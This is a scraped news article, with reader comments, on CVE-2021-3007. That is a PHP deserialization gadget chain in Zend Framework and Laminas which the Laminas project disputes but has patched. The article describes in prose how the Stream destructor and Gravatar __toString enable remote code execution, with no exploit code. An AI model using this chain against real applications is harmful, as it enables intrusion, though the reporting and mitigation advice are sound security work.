Ax Sharma is a security researcher and journalist focused on malware analyses and cybercrime investigations. His expertise includes open source software security, threat intel analysis, and reverse engineering. Frequently featured by leading media outlets like the BBC, Channel 5, Fortune, WIRED, among others, Ax is an active community member of the OWASP Foundation and the British Association of Journalists (BAJ).
Send any tips via email or Twitter DM.

* [Previous Article](https://www.bleepingcomputer.com/news/technology/slack-suffers-its-first-massive-outage-of-2021/)
* [Next Article](https://www.bleepingcomputer.com/news/security/citrix-adds-netscaler-adc-setting-to-block-recent-ddos-attacks/)

### Comments

* ![Saeven Photo](data:image/gif;base64...)
  ###### [Saeven](https://www.bleepingcomputer.com/forums/u/1190650/saeven/) - 4 years ago

  You're omitting a critical aspect of the conversation at [https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20反序列化%20rce.md](https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md)

  The attack chain starts with a developer-side implementation of insecure code. One should never blindly deserialize user-land posts on any framework!

  Object injection is a well-documented attack vector (<https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>).

  Unfortunately, I feel that ZF's name is being dragged through the mud unnecessarily here. The researcher found a convenient chain to call within ZF3 that could execute a callback thanks to the attack surface coded into the example IndexController, but that's where the problem truly lies. Bad developer-side code.

  This whole chain can be avoided by changing a singular line in the attack's nascent steps:

  unserialize(base64\_decode($data), ['allowed\_classes' => false]);

  Disabling classes during unserialization should ALWAYS be done, unless you know where the data is coming from, in which case you MUST encrypt it in transport. Doing any less is foolish and careless, and I repeat, has naught to do with ZF3/Laminas.

  So if anything emerges from this, scan your codebases for unserialize calls to see if you've repeated what the researcher had done, and fix it using the approach noted above.
* ![AxSharma Photo](data:image/gif;base64...)
  ###### [AxSharma](https://www.bleepingcomputer.com/forums/u/1164866/axsharma/) - 4 years ago

  Appreciate the feedback. Have added in the clarification.

  This particular exploit, like many, takes advantage of the gadget chain and magic methods within ZF3 to achieve RCE but the actual untrusted deserialization is happening within the app itself.
* ![dbawdy Photo](data:image/gif;base64...)
  ###### [dbawdy](https://www.bleepingcomputer.com/forums/u/1190670/dbawdy/) - 4 years ago

  This is no exploit in a Zend library, but a wrong usage of the unserialize function in PHP. With this usage you can "exploit" every application, also Wordpress, Wikimedia etc.

  Its very strange, that you can report a CVE with a really ugly dumbass usage of an internal PHP function.
* ![mwop Photo](data:image/gif;base64...)
  ###### [mwop](https://www.bleepingcomputer.com/forums/u/1190716/mwop/) - 4 years ago

  Hi - I am Project Lead for the Laminas Project, and formerly the project lead for Zend Framework.

  I'd like to point out a few things about this. First, the CVE in question has not been moderated or reviewed. We've had other journalists correctly come to us BEFORE reporting on the vulnerability for this very reason. Why do I bring this up? Because we were in contact with the researchers who reported the CVE at the end of November 2020, and had responded to them with essentially the same information as user Saeven reported in his earlier comment: this is a more generic PHP Object Injection vulnerability due to deserialization of untrusted user data. Assuming users follow standard industry security practices, the scenario should never present itself. Additionally, even with the code described in the CVE corrected (which we did via a release a short bit ago), the vulnerability can still be achieved by deserializing a class that includes a "\_\_destruct()" method... and this would be true in ANY PHP application.

  Our write-up is here: <https://github.com/laminas/laminas-http/pull/48>

  I would appreciate retraction of this article, or at least a nice big summary at the top indicating that the CVE in question is highly generic, and requires usage of known vulnerabilities in the PHP language to accomplish it.
* ![AxSharma Photo](data:image/gif;base64...)
  ###### [AxSharma](https://www.bleepingcomputer.com/forums/u/1164866/axsharma/) - 4 years ago

  Hello,

  Thanks for your feedback.

  I see in your pull request that Laminas now issued a patch to "verify a stream file name is a string before unlinking" in the concerned destructor to prevent the attackers from leveraging the gadget chain: <https://github.com/laminas/laminas-http/commit/019f31fe1c5449823e08ce98b0afd6835f5ffa32#diff-a1d5cc9e884a4772750d3bea9f1b8bda53fb383ef9990b3b2fffb95bfa672999R290>

  While I agree that the exploitation of untrusted deserialization requires poor code on the developer's side, in their app, and have already updated the article to strongly indicate this, the fix also shows it could have been prevented in the framework as well. Is that correct?

  Happy to understand this better and discuss via email, ax@axsharma.com or over Twitter DM.
* ![mwop Photo](data:image/gif;base64...)
  ###### [mwop](https://www.bleepingcomputer.com/forums/u/1190716/mwop/) - 4 years ago

  The fix in the framework is what is known as a security tightening measure. It is not indicative of a vulnerability, but it is a response to a potential misuse of our code. If you look carefully at the patch, two things specifically have to happen to cause the misuse:

  - The user must indicate that cleanup (removal of the file seeding the response stream) should occur once the response goes out of scope (at the end of the request).

  - The stream name must be presented as an object implementing "\_\_toString()".

  This latter is an interesting detail. PHP allows a number of "magic methods" in class definitions that fire under specific events in the runtime. "\_\_toString()" is one of these; when an object is used in a context where a string is expected, if it defines this method, then the method is called in order to produce a string representation. This is a hugely common practice; so much so that PHP 8 introduced a "Stringable" interface that defines it as the sole method required to fulfill its contract, and one of the chief arguments in favor of PHP 8's union types support was to allow typehints of "string|Stringable" to indicate that a string value is expected, but can be fulfilled by an object if desired.

  Another such method is "\_\_destruct()". This method is called when an object instance goes out of scope, which generally happens once code leaves a function or method, or, at the latest, when the request is completed and the response returned to the user. This is due to the fact that, generally speaking, PHP bootstraps every request and then tears its environment down when the request is complete. (I say generally speaking, because with some of the new async runtimes available, such as the Swoole extension or ReactPHP, you can have long-lived environments such as you might in Node.js. These applications are a very small percentage of overall PHP deployments, however.)

  The problem with magic methods such as these is that there are no limits to what you can do in them. Destructors are typically used to cleanup the environment — such as with operations like closing database or cache server connections, removing temp files, etc. Stringables are used in many scenarios, and particularly when providing complex representations or serializing data for API payloads. As such, they are used everywhere.

  It also means they are often targets of PHP Object Injection attacks. A PHP Object Injection attack relies on PHP's serialization engine, and the fact that it will serialize and deserialize any data structure, including classes. When deserializing a class instance, PHP will happily populate any properties at all when doing so.

  Unfortunately, prior to PHP 7.4, PHP did not allow providing typehints on class properties, which means that a deserialized instance can set the property values to any type at all, and thus avoid standard typechecks that occur elsewhere in a class — such as public setter methods. This is the primary reason why usage of "unserialize()" on untrusted user input is so dangerous, and why it is the root cause of this particular issue.

  What the CVE has done is bank on:

  - the fact that a destructor exists in a class

  - the destructor operating on the assumption that properties it queries were set using the defined class methods

  - the destructor using a property in a string context

  which allows the attacker to set the property to an instance of an object that defines a "\_\_toString()" method that in turn has side effects, composed in a class that defines a destructor which has side effects (removing a file).

  But all of this is predicated on the application author (\_not the framework\_) writing code that calls unserialize():

  - on user-provided input

  - without validation or sanitization

  - and without providing the second argument to "unserialize()" which provides a list of safe classes to deserialize

  I cannot stress this last set of points enough: the only way the framework code gets executed in the way described in the CVE is if the application author is writing code that is inherently insecure. While we can provide patches such as we have to mitigate such scenarios, these attacks rely on the researcher knowing that "unserialize()" is being used, knowing what classes are available in the application, and being able to exploit a magic method, generally a destructor, in one of those. As I've noted previously, magic methods are widely used in PHP; frameworks often have to rely on them in order to make things work correctly. The only feasible way a framework can prevent all such scenarios in code consuming it is to override the method "\_\_unserialize()" in each and every class it defines. No PHP frameworks do this; it's considered an application security issue, not a framework issue.

##### Post a Comment [Community Rules](https://www.bleepingcomputer.com/posting-guidelines/)

###### You need to login in order to post a comment

Not a member yet? [Register Now](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global&section=register)

### You may also like:

[![ThreatLocker](https://www.bleepstatic.com/c/t/threatlocker/ThreatLocker_400x500.png)](https://www.threatlocker.com/?utm_source=bleeping_computer&utm_medium=sponsor&utm_campaign=brand_enterprise_q1_25&utm_content=brand_enterprise&utm_term=display)

Popular Stories

* [![Microsoft 365](data:image/gif;base64...)

  Microsoft MFA outage blocking access to Microsoft 365 apps](https://www.bleepingcomputer.com/news/microsoft/microsoft-mfa-outage-blocking-access-to-microsoft-365-apps/)
* [![Apple](data:image/gif;base64...)

  Phishing texts trick Apple iMessage users into disabling protection](https://www.bleepingcomputer.com/news/security/phishing-texts-trick-apple-imessage-users-into-disabling-protection/)
* [![Patch Tuesday](data:image/gif;base64...)

  Microsoft January 2025 Patch Tuesday fixes 8 zero-days, 159 flaws](https://www.bleepingcomputer.com/news/microsoft/microsoft-january-2025-patch-tuesday-fixes-8-zero-days-159-flaws/)

Sponsor Posts

* [![Protecting Against Malicious Browser Extensions: The Complete Guide]()

  Protecting Against Malicious Browser Extensions: The Complete Guide](https://go.layerxsecurity.com/the-complete-guide-to-protecting-against-malicious-browser-extensions?utm_source=bleeping)
* [![Criminal IP: Real-Time Phishing Protection for Outlook Users]()

  Criminal IP: Real-Time Phishing Protection for Outlook Users](https://appsource.microsoft.com/en-us/product/office/WA200007637?tab=Overview)
* [![Password health-check overdue? Audit your Active Directory for free]()

  Password health-check overdue? Audit your Active Directory for free](https://specopssoft.com/product/specops-password-auditor/?utm_source=bleepingcomputer&utm_medium=referral&utm_campaign=na_bleepingcomputer&utm_content=article)
* [![Cynet Delivers 100% Protection and 100% Detection Visibility in 2024 MITRE ATT&CK Evaluation]()

  Cynet Delivers 100% Protection and 100% Detection Visibility in 2024 MITRE ATT&CK Evaluation](https://www.cynet.com/mitre-attck-results/?utm_source=BleepingComputer&utm_medium=sponsored_article&utm_campaign=Q4-sponsored-content&utm_content=MITREATT&CK2024)
* [![Save IT time with self-service password resets]()

  Save IT time with self-service password resets](https://specopssoft.com/product/specops-password-reset/?utm_source=bleepingcomputer&utm_medium=referral&utm_campaign=na_bleepingcomputer&utm_content=guest-post)

##### Follow us:

##### Main Sections

* [News](https://www.bleepingcomputer.com/)
* [VPN Buyer Guides](https://www.bleepingcomputer.com/vpn/)
* [SysAdmin Software Guides](https://www.bleepingcomputer.com/sysadmin/)
* [Downloads](https://www.bleepingcomputer.com/download/)
* [Virus Removal Guides](https://www.bleepingcomputer.com/virus-removal/)
* [Tutorials](https://www.bleepingcomputer.com/tutorials/)
* [Startup Database](https://www.bleepingcomputer.com/startups/)
* [Uninstall Database](https://www.bleepingcomputer.com/uninstall/)
* [Glossary](https://www.bleepingcomputer.com/glossary/)

##### Community

* [Forums](https://www.bleepingcomputer.com/forums/)
* [Forum Rules](https://www.bleepingcomputer.com/forum-rules/)
* [Chat](https://www.bleepingcomputer.com/forums/t/730914/the-bleepingcomputer-official-discord-chat-server-come-join-the-fun/)

##### Useful Resources

* [Welcome Guide](https://www.bleepingcomputer.com/welcome-guide/)
* [Sitemap](https://www.bleepingcomputer.com/sitemap/)

##### Company

* [About BleepingComputer](https://www.bleepingcomputer.com/about/)
* [Contact Us](https://www.bleepingcomputer.com/contact/)
* [Send us a Tip!](https://www.bleepingcomputer.com/news-tip/)
* [Advertising](https://www.bleepingcomputer.com/advertise/)
* [Write for BleepingComputer](https://www.bleepingcomputer.com/write-for-bleepingcomputer/)
* [Social & Feeds](https://www.bleepingcomputer.com/rss-feeds/)
* [Changelog](https://www.bleepingcomputer.com/changelog/)

[Terms of Use](https://www.bleepingcomputer.com/terms-of-use/) -  [Privacy Policy](https://www.bleepingcomputer.com/privacy/) - [Ethics Statement](https://www.bleepingcomputer.com/ethics-statement/) - [Affiliate Disclosure](https://www.bleepingcomputer.com/affiliate-disclosure/)

Copyright @ 2003 - 2025  [Bleeping Computer® LLC](https://www.bleepingcomputer.com/)  - All Rights Reserved

#### Login

Username

Password

Remember Me

Sign in anonymously

[![Sign in with Twitter button](https://www.bleepstatic.com/images/site/login/twitter.png) Sign in with Twitter](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global&section=login&serviceClick=twitter&return=https://www.bleepingcomputer.com/news/security/zend-framework-disputes-rce-vulnerability-issues-patch/)

---

Not a member yet? [Register Now](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global§ion=register "Register account")

#### Reporter

###### Help us understand the problem. What is going on with this comment?

* Spam
* Abusive or Harmful
* Inappropriate content
* Strong language
* Other

Read our [posting guidelinese](https://www.bleepingcomputer.com/posting-guidelines/) to learn what content is prohibited.

Submitting...
SUBMIT



=== Content from www.bleepingcomputer.com_44ce4dcd_20250115_124942.html ===


[![BleepingComputer.com logo](https://www.bleepstatic.com/images/site/logo.png)](https://www.bleepingcomputer.com/)

* [News](https://www.bleepingcomputer.com/)
  + [Featured](#nfeatured)
  + [Latest](#nlatest)
  + [![Microsoft January 2025 Patch Tuesday fixes 8 zero-days, 159 flaws](data:image/gif;base64...)

    Microsoft January 2025 Patch Tuesday fixes 8 zero-days, 159 flaws](https://www.bleepingcomputer.com/news/microsoft/microsoft-january-2025-patch-tuesday-fixes-8-zero-days-159-flaws/)
  + [![FBI deletes Chinese PlugX malware from thousands of US computers](data:image/gif;base64...)

    FBI deletes Chinese PlugX malware from thousands of US computers](https://www.bleepingcomputer.com/news/security/fbi-deletes-chinese-plugx-malware-from-thousands-of-us-computers/)
  + [![Fortinet warns of auth bypass zero-day exploited to hijack firewalls](data:image/gif;base64...)

    Fortinet warns of auth bypass zero-day exploited to hijack firewalls](https://www.bleepingcomputer.com/news/security/fortinet-warns-of-auth-bypass-zero-day-exploited-to-hijack-firewalls/)
  + [![Hackers use FastHTTP in new high-speed Microsoft 365 password attacks](data:image/gif;base64...)

    Hackers use FastHTTP in new high-speed Microsoft 365 password attacks](https://www.bleepingcomputer.com/news/security/hackers-use-fasthttp-in-new-high-speed-microsoft-365-password-attacks/)
  + [![Stay on top of the latest career skills with lifetime access to InfoSec4TC](data:image/gif;base64...)

    Stay on top of the latest career skills with lifetime access to InfoSec4TC](https://www.bleepingcomputer.com/offer/deals/stay-on-top-of-the-latest-career-skills-with-lifetime-access-to-infosec4tc/)
  + [![January Windows updates may fail if Citrix SRA is installed ](data:image/gif;base64...)

    January Windows updates may fail if Citrix SRA is installed](https://www.bleepingcomputer.com/news/microsoft/january-windows-updates-may-fail-if-citrix-sra-is-installed/)
  + [![Allstate car insurer sued for tracking drivers without permission](data:image/gif;base64...)

    Allstate car insurer sued for tracking drivers without permission](https://www.bleepingcomputer.com/news/legal/allstate-car-insurer-sued-for-tracking-drivers-without-permission/)
  + [![WP3.XYZ malware attacks add rogue admins to 5,000+ WordPress sites](data:image/gif;base64...)

    WP3.XYZ malware attacks add rogue admins to 5,000+ WordPress sites](https://www.bleepingcomputer.com/news/security/wp3xyz-malware-attacks-add-rogue-admins-to-5-000-plus-wordpress-sites/)
* [Tutorials](https://www.bleepingcomputer.com/tutorials/)
  + [Latest](#tlatest)
  + [Popular](#popular)
  + [![How to access the Dark Web using the Tor Browser](data:image/gif;base64...)

    How to access the Dark Web using the Tor Browser](/tutorials/how-to-access-the-dark-web-using-the-tor-browser/)
  + [![How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11](data:image/gif;base64...)

    How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11](/tutorials/how-to-enable-kernel-mode-hardware-enforced-stack-protection-in-windows-11/)
  + [![How to use the Windows Registry Editor](data:image/gif;base64...)

    How to use the Windows Registry Editor](/tutorials/how-to-use-the-windows-registry-editor/)
  + [![How to backup and restore the Windows Registry](data:image/gif;base64...)

    How to backup and restore the Windows Registry](/tutorials/how-to-backup-and-restore-the-windows-registry/)
  + [![How to start Windows in Safe Mode](data:image/gif;base64...)

    How to start Windows in Safe Mode](/tutorials/how-to-start-windows-in-safe-mode/)
  + [![How to remove a Trojan, Virus, Worm, or other Malware](data:image/gif;base64...)

    How to remove a Trojan, Virus, Worm, or other Malware](/tutorials/how-to-remove-a-trojan-virus-worm-or-malware/)
  + [![How to show hidden files in Windows 7](data:image/gif;base64...)

    How to show hidden files in Windows 7](/tutorials/show-hidden-files-in-windows-7/)
  + [![How to see hidden files in Windows](data:image/gif;base64...)

    How to see hidden files in Windows](/tutorials/how-to-see-hidden-files-in-windows/)
* [Virus Removal Guides](https://www.bleepingcomputer.com/virus-removal/)
  + [Latest](#vlatest)
  + [Most Viewed](#vmost)
  + [Ransomware](#ransomware)
  + [![Remove the Theonlinesearch.com Search Redirect](data:image/gif;base64...)

    Remove the Theonlinesearch.com Search Redirect](/virus-removal/remove-theonlinesearch.com-search-redirect)
  + [![Remove the Smartwebfinder.com Search Redirect](data:image/gif;base64...)

    Remove the Smartwebfinder.com Search Redirect](/virus-removal/remove-smartwebfinder.com-search-redirect)
  + [![How to remove the PBlock+ adware browser extension](data:image/gif;base64...)

    How to remove the PBlock+ adware browser extension](/virus-removal/how-to-remove-the-pblock-adware-extension)
  + [![Remove the Toksearches.xyz Search Redirect](data:image/gif;base64...)

    Remove the Toksearches.xyz Search Redirect](/virus-removal/remove-toksearches.xyz-search-redirect)
  + [![Remove Security Tool and SecurityTool (Uninstall Guide)](data:image/gif;base64...)

    Remove Security Tool and SecurityTool (Uninstall Guide)](/virus-removal/remove-security-tool)
  + [![How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo](data:image/gif;base64...)

    How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo](/virus-removal/remove-vundo-virtumonde)
  + [![How to remove Antivirus 2009 (Uninstall Instructions)](data:image/gif;base64...)

    How to remove Antivirus 2009 (Uninstall Instructions)](/virus-removal/uninstall-antivirus-2009)
  + [![How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller](data:image/gif;base64...)

    How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller](/virus-removal/remove-tdss-tdl3-alureon-rootkit-using-tdsskiller)
  + [![Locky Ransomware Information, Help Guide, and FAQ](data:image/gif;base64...)

    Locky Ransomware Information, Help Guide, and FAQ](/virus-removal/locky-ransomware-information-help)
  + [![CryptoLocker Ransomware Information Guide and FAQ](data:image/gif;base64...)

    CryptoLocker Ransomware Information Guide and FAQ](/virus-removal/cryptolocker-ransomware-information)
  + [![CryptorBit and HowDecrypt Information Guide and FAQ](data:image/gif;base64...)

    CryptorBit and HowDecrypt Information Guide and FAQ](/virus-removal/cryptorbit-ransomware-information)
  + [![CryptoDefense and How_Decrypt Ransomware Information Guide and FAQ](data:image/gif;base64...)

    CryptoDefense and How\_Decrypt Ransomware Information Guide and FAQ](/virus-removal/cryptodefense-ransomware-information)
* [Downloads](https://www.bleepingcomputer.com/download/)
  + [Latest](#dlatest)
  + [Most Downloaded](#most)
  + [![Qualys BrowserCheck](data:image/gif;base64...)

    Qualys BrowserCheck](https://www.bleepingcomputer.com/download/qualys-browsercheck/)
  + [![STOPDecrypter](data:image/gif;base64...)

    STOPDecrypter](https://www.bleepingcomputer.com/download/stopdecrypter/)
  + [![AuroraDecrypter](data:image/gif;base64...)

    AuroraDecrypter](https://www.bleepingcomputer.com/download/auroradecrypter/)
  + [![FilesLockerDecrypter](data:image/gif;base64...)

    FilesLockerDecrypter](https://www.bleepingcomputer.com/download/fileslockerdecrypter/)
  + [![AdwCleaner](data:image/gif;base64...)

    AdwCleaner](/download/adwcleaner/)
  + [![ComboFix](data:image/gif;base64...)

    ComboFix](/download/combofix/)
  + [![RKill](data:image/gif;base64...)

    RKill](/download/rkill/)
  + [![Junkware Removal Tool](data:image/gif;base64...)

    Junkware Removal Tool](/download/junkware-removal-tool/)
* [Deals](https://deals.bleepingcomputer.com/)
  + [Categories](#dcategories)
  + [![eLearning](data:image/gif;base64...)

    eLearning](https://deals.bleepingcomputer.com/deals/elearning?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![IT Certification Courses](data:image/gif;base64...)

    IT Certification Courses](https://deals.bleepingcomputer.com/deals/certifications?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![Gear & Gadgets](data:image/gif;base64...)

    Gear + Gadgets](https://deals.bleepingcomputer.com/deals/gear-gadgets?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![Security](data:image/gif;base64...)

    Security](https://deals.bleepingcomputer.com/collections/tag-cyber-security?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
* [VPNs](https://www.bleepingcomputer.com/vpn/)
  + [Popular](#vpopular)
  + [![Best VPNs](data:image/gif;base64...)

    Best VPNs](https://www.bleepingcomputer.com/vpn/guides/best-vpn/)
  + [![How to change IP address](data:image/gif;base64...)

    How to change IP address](https://www.bleepingcomputer.com/vpn/guides/change-ip-address/)
  + [![Access the dark web safely](data:image/gif;base64...)

    Access the dark web safely](https://www.bleepingcomputer.com/vpn/guides/access-dark-web-safely/)
  + [![Best VPN for YouTube](data:image/gif;base64...)

    Best VPN for YouTube](https://www.bleepingcomputer.com/vpn/guides/watch-youtube-tv-abroad-vpn/)
* [Forums](https://www.bleepingcomputer.com/forums/)
* More
  + [Startup Database](https://www.bleepingcomputer.com/startups/)
  + [Uninstall Database](https://www.bleepingcomputer.com/uninstall/)
  + [Glossary](https://www.bleepingcomputer.com/glossary/)
  + [Chat on Discord](https://www.bleepingcomputer.com/forums/t/730914/the-bleepingcomputer-official-discord-chat-server-come-join-the-fun/)
  + [Send us a Tip!](https://www.bleepingcomputer.com/news-tip/)
  + [Welcome Guide](https://www.bleepingcomputer.com/welcome-guide/)

* [Home](https://www.bleepingcomputer.com/)
* [News](https://www.bleepingcomputer.com/news/)
* [Security](https://www.bleepingcomputer.com/news/security/)
* Zend Framework disputes RCE vulnerability, issues patch

# Zend Framework disputes RCE vulnerability, issues patch

By
###### [Ax Sharma](https://www.bleepingcomputer.com/author/ax-sharma/)

* January 4, 2021
* 11:05 AM
* [6](#comments)

![Zend Framework background](https://www.bleepstatic.com/content/hl-images/2021/01/04/zend.jpg)

An untrusted deserialization vulnerability has been disclosed this week in how Zend Framework can be exploited by attackers to achieve remote code execution on vulnerable PHP sites.

This vulnerability tracked as CVE-2021-3007 may also impact apps built with Laminas Project, Zend's successor.

Zend Framework consists of PHP packages installed over **570 million** times. The framework is used by developers to build object-oriented web applications.

The project has now disputed the vulnerability due to the fact the exploitation requires vulnerable deserialization to take place within the developer's app. However, Laminas has still issued a patch to "tighten security" in its framework.

## From untrusted deserialization to RCE

This week, security researcher Ling Yizhou has disclosed how a particular gadget chain in Zend Framework 3.0.0 could be abused in untrusted deserialization attacks.

If exploited, the flaw could allow remote attackers to conduct remote code execution (RCE) attacks on vulnerable PHP applications under certain circumstances.

"Zend Framework 3.0.0 has a deserialization vulnerability that can lead to remote code execution if the content is controllable, related to the *\_\_destruct* method of the *Zend\Http\Response\Stream* class in *Stream.php*," states MITRE's advisory for [CVE-2021-3007](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3007).

**While the actual untrusted deserialization has to come from a vulnerable application and does not exist in Zend Framework itself, the chain of classes provided by Zend allows an attacker to achieve RCE.**

Untrusted deserialization vulnerabilities occur in applications when encoded data being received by the application from a user or a system is not properly validated before it is decoded by the application.

A vulnerable application may deserialize and process the received data of an improper format, which can have consequences ranging from application crashes (Denial of Service) to the attacker being able to run arbitrary commands in the context of the application.

In the case of Zend, the vulnerability stems from the destructor of the *Stream* class which is a PHP [magic method](https://www.php.net/manual/en/language.oop5.magic.php).

In object-oriented programming, constructors and destructors are methods that are respectively called when a new class object is created and destroyed.

For example, a newly created *Stream* object, in this case, would run a series of commands at its conception via the *constructor*.

Once the object has served its purpose throughout the program execution workflow, the PHP interpreter will eventually call the object's destructor and follow another sequence of commands to free up memory, perform cleanup tasks and delete any temporary files, as a good practice.

Yizhou [points out](https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md) the *unlink()* method called by *Stream's*destructor for deleting a file expects a filename as a parameter, which is of the *string* data type.

![Zend Framework CVE-2021-3007 vulnerable destructor](https://www.bleepstatic.com/images/news/u/1164866/2021/Jan%202021/zend%20laminas/destructor_laminas.png)

**Vulnerable destructor in Zend Framework and Laminas Project**

Source: [GitHub](https://github.com/laminas/laminas-http/blob/2.15.x/src/Response/Stream.php#L285)

In effect, should the *streamName* object be of a non-string type, at the end of the application execution it would still get passed to the destructor.

The destructor, which only expects a string value would therefore attempt to call the object's *\_\_toString* method, to get its string-equivalent value.

But, the *\_\_toString* method can be easily customized by the creator of the object, or rather the creator of the *class* that the object instantiates.

As an example, Yizhou highlighted the *\_\_toString* method in the *Gravatar* class of Zend Framework had been written by its programmers in such a way that it eventually returned values that the attacker had direct control over, to execute arbitrary code.

This means, should the *Stream* class be passed a *Gravator*object where *streamName* is expected, under certain circumstances, the threat actor could run arbitrary commands within vulnerable PHP applications built with Zend.

The researcher demonstrated at least 2 scenarios in which it was possible to pass serialized objects to Zend, which when parsed by the PHP application would render the output of attacker's the commands on the rendered webpages.

In a proof-of-concept (PoC) exploit, the researcher demonstrated how the web app's *phpinfo* page successfully parsed his system command "whoami" passed through a serialized HTTP request, and returned the Windows account name, "nt authority\system."

![whoami command output zend framework vulnerability](https://www.bleepstatic.com/images/news/u/1164866/2021/Jan%202021/zend%20laminas/whoami_zend_framework.png)

**Researcher ran "whoami" command successfully in a demo PoC and obtained "nt authority\system" output**

Source: Yizhou

## Apps built with Laminas may also be impacted

In January 2020, Zend Framework was [migrated](https://framework.zend.com/blog/2020-01-24-laminas-launch) to Laminas project with a significant amount of code simply having been relocated to the newer codebase.

For example, Zend's [*Stream.php*](https://github.com/laminas/laminas-http/commits/2.15.x/src/Response/Stream.php) class with the aforementioned destructor continues to exist in some versions of Laminas.

"The code may be related to Laminas Project *laminas-http*. Zend Framework is no longer supported by the maintainer. However, not all Zend Framework 3.0.0 vulnerabilities exist in a Laminas Project release," states MITRE's advisory.

While this does not necessarily indicate all applications built with Laminas project are vulnerable, developers are advised to do their due diligence.

Considering PHP powers [about 80% of the internet sites](https://w3techs.com/technologies/details/pl-php) in some capacity, and given the historic popularity of Zend Framework, developers are advised to thoroughly check their web applications for cases of untrusted object deserialization.

A similar gadget chain has been found in [Yii Framework](https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/) this week which the attackers can use to target vulnerable applications.

Performing thorough security audits of your applications is one way to spot zero-days and vulnerabilities specific to your environment from time to time.

**Update 5-Jan-2021:**Clarified the gadget chain in Zend Framework may aid in achieving RCE for an application vulnerable to untrusted deserialization.

Laminas Project has issued a minor security [patch](https://github.com/laminas/laminas-http/pull/48) on GitHub to update the aforementioned destructor in *Stream* class, while disputing the CVE reported by Yizhou.

The project's reasons for disputing the vulnerability and issuing a security enhancement have been outlined in the [comments](https://www.bleepingcomputer.com/news/security/zend-framework-remote-code-execution-vulnerability-revealed/#cid17822) section below.

### Related Articles:

[Ivanti warns of new Connect Secure flaw used in zero-day attacks](https://www.bleepingcomputer.com/news/security/ivanti-warns-of-new-connect-secure-flaw-used-in-zero-day-attacks/)

[Unpatched critical flaws impact Fancy Product Designer WordPress plugin](https://www.bleepingcomputer.com/news/security/unpatched-critical-flaws-impact-fancy-product-designer-wordpress-plugin/)

[Apache warns of critical flaws in MINA, HugeGraph, Traffic Control](https://www.bleepingcomputer.com/news/security/apache-warns-of-critical-flaws-in-mina-hugegraph-traffic-control/)

[Apache fixes remote code execution bypass in Tomcat web server](https://www.bleepingcomputer.com/news/security/apache-fixes-remote-code-execution-bypass-in-tomcat-web-server/)

[New critical Apache Struts flaw exploited to find vulnerable servers](https://www.bleepingcomputer.com/news/security/new-critical-apache-struts-flaw-exploited-to-find-vulnerable-servers/)

* [Code Injection](https://www.bleepingcomputer.com/tag/code-injection/)
* [PHP](https://www.bleepingcomputer.com/tag/php/)
* [Remote Code Execution](https://www.bleepingcomputer.com/tag/remote-code-execution/)
* [Severity](https://www.bleepingcomputer.com/tag/severity/)
* [Vulnerability](https://www.bleepingcomputer.com/tag/vulnerability/)

##### [Ax Sharma](https://www.bleepingcomputer.com/author/ax-sharma/)

Ax Sharma is a security researcher and journalist focused on malware analyses and cybercrime investigations. His expertise includes open source software security, threat intel analysis, and reverse engineering. Frequently featured by leading media outlets like the BBC, Channel 5, Fortune, WIRED, among others, Ax is an active community member of the OWASP Foundation and the British Association of Journalists (BAJ).
Send any tips via email or Twitter DM.

* [Previous Article](https://www.bleepingcomputer.com/news/technology/slack-suffers-its-first-massive-outage-of-2021/)
* [Next Article](https://www.bleepingcomputer.com/news/security/citrix-adds-netscaler-adc-setting-to-block-recent-ddos-attacks/)

### Comments

* ![Saeven Photo](data:image/gif;base64...)
  ###### [Saeven](https://www.bleepingcomputer.com/forums/u/1190650/saeven/) - 4 years ago

  You're omitting a critical aspect of the conversation at [https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20反序列化%20rce.md](https://github.com/Ling-Yizhou/zendframework3-/blob/main/zend%20framework3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20rce.md)

  The attack chain starts with a developer-side implementation of insecure code. One should never blindly deserialize user-land posts on any framework!

  Object injection is a well-documented attack vector (<https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>).

  Unfortunately, I feel that ZF's name is being dragged through the mud unnecessarily here. The researcher found a convenient chain to call within ZF3 that could execute a callback thanks to the attack surface coded into the example IndexController, but that's where the problem truly lies. Bad developer-side code.

  This whole chain can be avoided by changing a singular line in the attack's nascent steps:

  unserialize(base64\_decode($data), ['allowed\_classes' => false]);

  Disabling classes during unserialization should ALWAYS be done, unless you know where the data is coming from, in which case you MUST encrypt it in transport. Doing any less is foolish and careless, and I repeat, has naught to do with ZF3/Laminas.

  So if anything emerges from this, scan your codebases for unserialize calls to see if you've repeated what the researcher had done, and fix it using the approach noted above.
* ![AxSharma Photo](data:image/gif;base64...)
  ###### [AxSharma](https://www.bleepingcomputer.com/forums/u/1164866/axsharma/) - 4 years ago

  Appreciate the feedback. Have added in the clarification.

  This particular exploit, like many, takes advantage of the gadget chain and magic methods within ZF3 to achieve RCE but the actual untrusted deserialization is happening within the app itself.
* ![dbawdy Photo](data:image/gif;base64...)
  ###### [dbawdy](https://www.bleepingcomputer.com/forums/u/1190670/dbawdy/) - 4 years ago

  This is no exploit in a Zend library, but a wrong usage of the unserialize function in PHP. With this usage you can "exploit" every application, also Wordpress, Wikimedia etc.

  Its very strange, that you can report a CVE with a really ugly dumbass usage of an internal PHP function.
